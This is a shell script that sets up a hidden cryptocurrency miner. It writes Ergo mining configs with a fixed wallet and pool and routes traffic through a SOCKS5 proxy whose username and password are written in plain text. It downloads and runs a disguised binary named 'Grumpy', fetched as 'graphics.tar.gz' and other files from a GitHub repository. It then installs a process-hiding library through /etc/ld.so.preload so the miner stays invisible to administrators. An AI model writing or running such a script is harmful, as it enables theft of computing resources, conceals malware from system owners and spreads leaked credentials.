#!/bin/sh
cat > config_ergo.ini <<END
[autolykos]
wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
coin = ERG
rigName = Grumy_Dwarf
pool1 = stratum-ergo.flypool.org:3443
END

cat > config.ini <<END
[autolykos]
wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
coin = ERG
rigName = Grumy_Dwarf
pool1 = stratum-ergo.flypool.org:3443
END

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 3.16.66.235:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Grumpy
chmod +x Grumpy

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicGru.zip
unzip magicGru.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./Grumpy



